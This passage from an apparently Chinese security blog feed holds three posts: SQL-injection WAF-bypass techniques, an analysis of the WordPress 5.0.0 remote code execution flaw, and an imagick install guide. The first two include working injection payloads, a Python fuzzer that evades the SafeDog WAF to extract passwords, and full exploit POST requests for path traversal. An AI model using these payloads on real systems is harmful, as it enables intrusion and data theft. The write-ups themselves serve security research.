class="keyword">user</span>())a)b));</span><br><span class="line">(12) 通过linestring ()报错,注入语句如下:</span><br><span class="line">    and multilinestring((<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br></pre></td></tr></table></figure></li><li><p>过滤特殊字符</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">(1)limit处的逗号： limit 1 offset 0</span><br><span class="line"></span><br><span class="line">(2)字符串截取处的逗号 mid处的逗号： mid(version() from 1 for 1)</span><br><span class="line"></span><br><span class="line">(3)union处的逗号： 通过join拼接。</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">admin</span> <span class="keyword">WHERE</span> username = <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> * <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>)a <span class="keyword">join</span>(<span class="keyword">select</span>&#123;x schema_name&#125; <span class="keyword">from</span> information_schema.SCHEMATA <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span>)b</span><br><span class="line"></span><br><span class="line"> (<span class="number">4</span>)操作符&lt;&gt;被过滤</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> <span class="keyword">ascii</span>(<span class="keyword">substr</span>(<span class="keyword">database</span>(),<span class="number">0</span>,<span class="number">1</span>))&gt;<span class="number">64</span></span><br><span class="line"></span><br><span class="line">此时如果比较操作符被过滤，上面的盲注语句则无法使用,那么就可以使用<span class="keyword">greatest</span>来代替比较操作符了。<span class="keyword">greatest</span>(n1,n2,n3,等)函数返回输入参数(n1,n2,n3,等)的最大值。那么上面的这条<span class="keyword">sql</span>语句可以使用<span class="keyword">greatest</span>变为如下的子句:</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> <span class="keyword">greatest</span>(<span class="keyword">ascii</span>(<span class="keyword">substr</span>(<span class="keyword">database</span>(),<span class="number">0</span>,<span class="number">1</span>)),<span class="number">64</span>)=<span class="number">64</span>总结：使用<span class="keyword">greatest</span>()绕过比较操作符。</span><br></pre></td></tr></table></figure></li></ul><h2 id="0x03-绕过安全狗"><a href="#0x03-绕过安全狗" class="headerlink" title="0x03 绕过安全狗"></a>0x03 绕过安全狗</h2><p>测试狗狗为最新版<br><img src="https://i.loli.net/2019/03/05/5c7e3926cceeb.png" alt><br>经测试，狗狗拦截点为union select之间和from之后<br>from之后可以使用破浪号或者花括号形式绕过，而union select可以使用注释符<code>/**/</code>方法,但是单纯的注释符会触发狗狗的拦截规则，这里对其填充字符进行fuzz<br><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">burp0_url = <span class="string">"http://127.0.0.1:80/test.php?id=-1 union/*%&#123;0&#125;%&#123;1&#125;*/select 1,password,3 from`user`"</span></span><br><span class="line">burp0_cookies = &#123;<span class="string">"ECS[visit_times]"</span>: <span class="string">"9"</span>, <span class="string">"__atuvc"</span>: <span class="string">"2%7C6"</span>, <span class="string">"safedog-flow-item"</span>: <span class="string">"83B003D84BC326490BB46CB86446460A"</span>&#125;</span><br><span class="line">burp0_headers = &#123;<span class="string">"Cache-Control"</span>: <span class="string">"max-age=0"</span>, <span class="string">"Upgrade-Insecure-Requests"</span>: <span class="string">"1"</span>, <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36"</span>, <span class="string">"Accept"</span>: <span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8"</span>, <span class="string">"Accept-Language"</span>: <span class="string">"zh-CN,zh;q=0.9"</span>, <span class="string">"Connection"</span>: <span class="string">"close"</span>&#125;</span><br><span class="line">requests.<span class="built_in">get</span>(burp0_url, headers=burp0_headers, cookies=burp0_cookies)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">0</span>,<span class="number">128</span>):</span><br><span class="line"><span class="keyword">for</span> x in range(<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line">a=burp0_url.format(<span class="built_in">str</span>(<span class="built_in">hex</span>(i))[<span class="number">2</span>:],<span class="built_in">str</span>(<span class="built_in">hex</span>(x))[<span class="number">2</span>:])</span><br><span class="line">req = requests.<span class="built_in">get</span>(a,headers=burp0_headers,cookies=burp0_cookies)</span><br><span class="line"><span class="keyword">if</span> <span class="string">'dc647eb65e6711e155375218212b3964'</span> in req.<span class="built_in">text</span>:</span><br><span class="line"><span class="built_in">print</span> <span class="string">'[+]'</span>+a</span><br><span class="line"><span class="built_in">print</span> <span class="string">'[+]'</span>+<span class="string">'%'</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(i))[<span class="number">2</span>:]+<span class="string">'%'</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(x))[<span class="number">2</span>:]+<span class="string">'   '</span>+chr(i)+<span class="string">'    '</span>+chr(x)</span><br></pre></td></tr></table></figure></p><p> 以下姿势均可以绕过<br><img src="https://i.loli.net/2019/03/05/5c7e3b2a7f5e3.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x01-http协议层面绕过waf&quot;&gt;&lt;a href=&quot;#0x01-http协议层面绕过waf&quot; class=&quot;headerlink&quot; title=&quot;0x01 http协议层面绕过waf&quot;&gt;&lt;/a&gt;0x01 http协议层面绕过waf&lt;/h2&gt;&lt;p&gt;此部分参考&lt;
      
    
    </summary>
    
      <category term="web安全" scheme="https://zhengbao.wang/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="bypass" scheme="https://zhengbao.wang/tags/bypass/"/>
    
      <category term="sql注入" scheme="https://zhengbao.wang/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>wordpress5.0.0 远程代码执行漏洞分析</title>
    <link href="https://zhengbao.wang/wordpress5-0-0-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>https://zhengbao.wang/wordpress5-0-0-远程代码执行漏洞分析/</id>
    <published>2019-02-26T09:10:16.000Z</published>
    <updated>2019-03-07T03:38:51.293Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>该漏洞由RIPS团队发现并公开在其<a href="https://blog.ripstech.com/2019/wordpress-image-remote-code-execution/" target="_blank" rel="noopener">Blog</a>,在其blog中可发现该漏洞为数据覆盖+目录穿越写文件+文件包含三个漏洞组成的远程代码执行漏洞。<br>根据其提供的漏洞细节可发现在<code>edit_post()</code>中未对post数据做任何过滤，导致可以传入<code>meta_input</code>数组并最终对数据库内容进行覆盖。这一方法在发生在对媒体文件修改属性时调用，因此需要具有author权限，在操作的媒体文件数据中<code>_wp_attached_file</code>字段指明了文件路径，而在对图片进行裁剪操作时，图片存放文章取决于该字段，因此可以实现目录穿越向任意目录写文件，最终可以将文件写入到主题文件进行包含的位置可实现远程代码执行。</p><h2 id="0x01-漏洞分析"><a href="#0x01-漏洞分析" class="headerlink" title="0x01 漏洞分析"></a>0x01 漏洞分析</h2><h3 id="数据覆盖漏洞"><a href="#数据覆盖漏洞" class="headerlink" title="数据覆盖漏洞"></a>数据覆盖漏洞</h3><p>根据RIPS提供的信息，漏洞发生在<code>edit_post</code>方法和<code>update_post_meta</code>方法中，直接跟踪到这两个方法。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">edit_post</span><span class="params">( $post_data = null )</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( <span class="keyword">empty</span>($postarr) )</span><br><span class="line">        $postarr = &amp;$_POST;</span><br><span class="line">    ⋮</span><br><span class="line">    <span class="keyword">if</span> ( ! <span class="keyword">empty</span>( $postarr[<span class="string">'meta_input'</span>] ) ) &#123;</span><br><span class="line">        <span class="keyword">foreach</span> ( $postarr[<span class="string">'meta_input'</span>] <span class="keyword">as</span> $field =&gt; $value ) &#123;</span><br><span class="line">            update_post_meta( $post_ID, $field, $value );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>在<code>edit_post</code>方法中发现对post来的数据未做任何处理。<br><img src="https://i.loli.net/2019/02/25/5c73afd199832.png" alt><br>而对图片属性进行修改时可直接诱发该方法<br><img src="https://i.loli.net/2019/02/25/5c73b0194df09.png" alt></p><p>然后调用<code>update_post_meta</code>方法根据post_ID修改<code>post meta field</code>,调用<code>wp_update_post</code>方法更新post_data。<br><img src="https://i.loli.net/2019/02/25/5c73b53c53f1e.png" alt><br>在<code>wp_update_post</code>方法中会调用<code>wp_insert_post()</code><br><img src="https://i.loli.net/2019/02/25/5c73b6b1a66ce.png" alt><br>在<code>wp_insert_post()</code>方法中遍历meta_input调用<code>update_post_meta</code>对数据进行更新操作，<br><img src="https://i.loli.net/2019/02/25/5c73b3e3949ae.png" alt></p><p>函数调用栈，<br><img src="https://i.loli.net/2019/02/25/5c73b4bae8510.png" alt></p><p>至此可覆盖数据库中<code>_wp_attached_file</code>内容<br><img src="https://i.loli.net/2019/02/25/5c73b7516622b.png" alt><br>post数据包，只需在正常修改图片属性post数据中添加<code>&amp;meta_input[_wp_attached_file]=/test/boogle.jpg</code><br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">post</span><br><span class="line"></span><br><span class="line">_wpnonce=<span class="number">6</span>b7df5b262&amp;_wp_http_referer=%<span class="number">2</span>Fwordpress<span class="number">-5.0</span>%<span class="number">2</span>Fwp-admin%<span class="number">2</span>Fpost.php%<span class="number">3</span>Fpost%<span class="number">3</span>D7%<span class="number">26</span>action%<span class="number">3</span>Dedit%<span class="number">26</span>message%<span class="number">3</span>D1&amp;user_ID=<span class="number">2</span>&amp;action=editpost&amp;originalaction=editpost&amp;post_author=<span class="number">2</span>&amp;post_type=attachment&amp;original_post_status=inherit&amp;referredby=http%<span class="number">3</span>A%<span class="number">2</span>F%<span class="number">2</span>F127<span class="number">.0</span><span class="number">.0</span><span class="number">.1</span>%<span class="number">2</span>Fwordpress<span class="number">-5.0</span>%<span class="number">2</span>Fwp-admin%<span class="number">2</span>Fpost.php%<span class="number">3</span>Fpost%<span class="number">3</span>D7%<span class="number">26</span>action%<span class="number">3</span>Dedit&amp;_wp_original_http_referer=http%<span class="number">3</span>A%<span class="number">2</span>F%<span class="number">2</span>F127<span class="number">.0</span><span class="number">.0</span><span class="number">.1</span>%<span class="number">2</span>Fwordpress<span class="number">-5.0</span>%<span class="number">2</span>Fwp-admin%<span class="number">2</span>Fpost.php%<span class="number">3</span>Fpost%<span class="number">3</span>D7%<span class="number">26</span>action%<span class="number">3</span>Dedit&amp;post_ID=<span class="number">7</span>&amp;meta-box-order-nonce=<span class="number">39163</span>aa91a&amp;closedpostboxesnonce=<span class="number">1e6416</span>f7d7&amp;post_title=avatar&amp;samplepermalinknonce=<span class="number">7548</span>fad608&amp;excerpt=<span class="number">123</span>&amp;_wp_attachment_image_alt=<span class="number">123</span>&amp;content=sdd&amp;attachment_url=http%<span class="number">3</span>A%<span class="number">2</span>F%<span class="number">2</span>F127<span class="number">.0</span><span class="number">.0</span><span class="number">.1</span>%<span class="number">2</span>Fwordpress<span class="number">-5.0</span>%<span class="number">2</span>Fwp-content%<span class="number">2</span>Fuploads%<span class="number">2</span>F2019%<span class="number">2</span>F02%<span class="number">2</span>F2<span class="number">-4.</span>jpg%<span class="number">23</span>%<span class="number">2</span>F..%<span class="number">2</span>F..%<span class="number">2</span>F..%<span class="number">2</span>F..%<span class="number">2</span>Fthemes%<span class="number">2</span>Ftwentynineteen%<span class="number">2</span>F32.jpg&amp;original_publish=Update&amp;save=Update&amp;advanced_view=<span class="number">1</span>&amp;comment_status=open&amp;add_comment_nonce=<span class="number">17653878</span>f1&amp;_ajax_fetch_list_nonce=<span class="number">82034e96</span>c4&amp;_wp_http_referer=%<span class="number">2</span>Fwordpress<span class="number">-5.0</span>%<span class="number">2</span>Fwp-admin%<span class="number">2</span>Fpost.php%<span class="number">3</span>Fpost%<span class="number">3</span>D7%<span class="number">26</span>action%<span class="number">3</span>Dedit%<span class="number">26</span>message%<span class="number">3</span>D1&amp;post_name=avatar<span class="number">-2</span>&amp;meta_input[_wp_attached_file]=/test/boogle.jpg</span><br></pre></td></tr></table></figure></p><h3 id="目录穿越写文件"><a href="#目录穿越写文件" class="headerlink" title="目录穿越写文件"></a>目录穿越写文件</h3><p>上面我们已经能够控制<code>_wp_attached_file</code>的值，但这并什么带来什么实际影响，因此进行全局搜索，看看哪些地方用到了这个值，并进一步进行利用。<br>搜索发现在<code>get_attached_file()</code>方法中，对该值进行了获取，最拼接在<code>$file</code>变量中返回<br><img src="https://i.loli.net/2019/02/25/5c73cebf0ebff.png" alt></p><blockquote><p>补充：在wordpress在图片裁剪时，首先会从默认目录<code>wp-content\uploads\yyyy\mm</code>查找，如果不存在，则会从本地服务器下载，下载url为<code>http://127.0.0.1/wordpress/wp-content/uploads</code>+<code>_wp_attached_file</code>拼接的结果，这里可以使用url获取资源的特点，如<code>boogle.jpg?../../boo.jpg</code>本地查找不存在而下载时又会定位到boogle.jpg，而忽略<code>?</code>后面的内容。另外windows目录中不允许存在<code>?</code>，可以使用<code>#</code>代替。</p></blockquote><p>然后继续向上跟踪查看哪里调用了该方法。定位到<code>wp_crop_image()</code>方法，并且在该方法中进行了简单拼接作为文件名进行了保存，而该方法的作用为裁剪图片，即我们可以能控制裁剪操作后图片保存的位置。<br><img src="https://i.loli.net/2019/02/25/5c73cfa537baf.png" alt><br>继续向上跟踪，在<code>wp_ajax_crop_image()</code>方法中对裁剪方法进行了调用<br><img src="https://i.loli.net/2019/02/25/5c73d0c431eed.png" alt><br>跟踪到这时本来一切顺利，心思只要进行图片裁剪便会触发漏洞，然而还是水平太菜，没有触发漏洞，也没有定位到哪里调用了该方法，此处膜拜大佬。</p><p>问题出现在在进行裁剪时没有调用该裁剪方法，而需要修改数据包手动调用。<br>在<code>admin-ajax.php</code>对这些方法进行了判断<br><img src="https://i.loli.net/2019/02/25/5c73d68ebd65d.png" alt></p><p><img src="https://i.loli.net/2019/02/25/5c73d6c391f88.png" alt><br>最终在<code>apply_filters()</code>方法中，进行了动态调用<br><img src="https://i.loli.net/2019/02/25/5c73d729d6495.png" alt></p><p>这里直接附post<br><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST </span><br><span class="line"></span><br><span class="line">action=crop-image&amp;_ajax_nonce=b<span class="number">259</span>baa<span class="number">5</span><span class="keyword">c</span><span class="number">9</span>&amp;postid=<span class="number">8</span>&amp;history=<span class="symbol">%5</span>B<span class="symbol">%7</span>B<span class="symbol">%22</span><span class="keyword">c</span><span class="symbol">%22</span><span class="symbol">%3</span>A<span class="symbol">%7</span>B<span class="symbol">%22</span><span class="keyword">x</span><span class="symbol">%22</span><span class="symbol">%3</span>A<span class="number">24</span><span class="symbol">%2</span>C<span class="symbol">%22</span>y<span class="symbol">%22</span><span class="symbol">%3</span>A<span class="number">21</span><span class="symbol">%2</span>C<span class="symbol">%22</span>w<span class="symbol">%22</span><span class="symbol">%3</span>A<span class="number">40</span><span class="symbol">%2</span>C<span class="symbol">%22</span>h<span class="symbol">%22</span><span class="symbol">%3</span>A<span class="number">44</span><span class="symbol">%7</span>D<span class="symbol">%7</span>D<span class="symbol">%5</span>D&amp;<span class="keyword">target</span>=all&amp;context=&amp;do=save&amp;id=<span class="number">8</span>&amp;cropDetails[dst_width]=<span class="number">8</span>&amp;cropDetails[dst_height]=<span class="number">8</span></span><br></pre></td></tr></table></figure></p><h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><p>后面讲继续分析，这里可以参考<a href="https://mp.weixin.qq.com/s/9DMGLOvFJUjq8MaMr9eg6A" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/9DMGLOvFJUjq8MaMr9eg6A</a></p><h2 id="0x02-补丁修复"><a href="#0x02-补丁修复" class="headerlink" title="0x02 补丁修复"></a>0x02 补丁修复</h2><p>补丁增加了对<code>meta_input</code>的过滤，将其从post中移除。<br><img src="https://i.loli.net/2019/03/02/5c7a2b9e20c0e.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;该漏洞由RIPS团队发现并公开在其&lt;a href=&quot;https://blog.ripstech.co
      
    
    </summary>
    
      <category term="web安全" scheme="https://zhengbao.wang/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="代码审计" scheme="https://zhengbao.wang/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="wordpress" scheme="https://zhengbao.wang/tags/wordpress/"/>
    
  </entry>
  
  <entry>
    <title>windows+apache+php7.0安装php扩展之imagick踩过的大坑</title>
    <link href="https://zhengbao.wang/windows-apache-php7-0%E5%AE%89%E8%A3%85php%E6%89%A9%E5%B1%95%E4%B9%8Bimagick%E8%B8%A9%E8%BF%87%E7%9A%84%E5%A4%A7%E5%9D%91/"/>
    <id>https://zhengbao.wang/windows-apache-php7-0安装php扩展之imagick踩过的大坑/</id>
    <published>2019-02-26T03:37:27.000Z</published>
    <updated>2019-03-07T03:38:47.213Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>在安装之前还特意在<a href="http://php.net/manual/zh/imagick.setup.php" target="_blank" rel="noopener">manual</a>上查看了一下安装过程<br><img src="https://i.loli.net/2019/02/26/5c74adfcdfb2a.png" alt><br><code>下载dll-&gt;copy到php扩展目录-&gt;添加配置到php.ini</code><br>然而事情并没有那么简单–</p><h2 id="0x01-踩坑之旅"><a href="#0x01-踩坑之旅" class="headerlink" title="0x01 踩坑之旅"></a>0x01 踩坑之旅</h2><p>上述方法无效后就开始了愉快的网上冲浪环节，在前人的记录中，找到需要安装<code>ImageMagick</code>控件。<br>然而安装后还是出现运行<code>php -m</code>还是出现了无法加载模块的错误<br>然后又有前人记载，可能是imagemakick版本太高的原因，然后又进行降级安装，此时又爆出弹窗错误，提示无法定位到dll。<br>其中部分环节过于血腥忘记了一部分。</p><h2 id="0x02-正确姿势"><a href="#0x02-正确姿势" class="headerlink" title="0x02 正确姿势"></a>0x02 正确姿势</h2><ul><li>首先下载安装<code>ImageMagick-6.7.5-0-Q8-windows-dll</code><a href="https://ftp.icm.edu.pl/packages/ImageMagick/binaries/" target="_blank" rel="noopener">https://ftp.icm.edu.pl/packages/ImageMagick/binaries/</a> 建议版本不要过高，安装时采用默认安装便会将目录添加到环境变量。</li><li>将目录下的所有 <code>CORE_RL_*.dll</code>复制到<code>apache/bin</code>目录下</li><li>下载php扩展imagick<a href="http://pecl.php.net/package/imagick/3.4.1/windows" target="_blank" rel="noopener">http://pecl.php.net/package/imagick/3.4.1/windows</a>，按照需要选择版本</li><li>将解压后目录内的<code>php_imagick.dll</code>放到php扩展目录<code>ext</code>下</li><li>添加<code>extension=php_imagick.dll</code>到<code>php.ini</code>文件</li><li>将目录内的八个<code>CORE_RL_*.dll</code>文件复制到<code>php.exe</code>所在目录</li><li>重启apache,必要条件下需要重启计算机。查看phpinfo当<code>$_SERVER[&#39;PATH&#39;]</code>中不包含<code>ImageMagick</code>的环境变量时重启</li><li>运行<code>php -m| findstr imagick</code>或者<code>php -i | findstr imagick</code>或者<code>phpinfo()</code>查看是否成功<h2 id="0x03-成功截图"><a href="#0x03-成功截图" class="headerlink" title="0x03 成功截图"></a>0x03 成功截图</h2></li></ul><p><code>php -i| findstr imagick</code></p><p><img src="https://i.loli.net/2019/02/26/5c74b350692b4.png" alt><br><code>phpinfo</code><br><img src="https://i.loli.net/2019/02/26/5c74b3a35337b.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;在安装之前还特意在&lt;a href=&quot;http://php.net/manual/zh/imagick
      
    
    </summary>
    
      <category term="环境配置" scheme="https://zhengbao.wang/categories/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"/>
    
    
  </entry>
  
</feed>
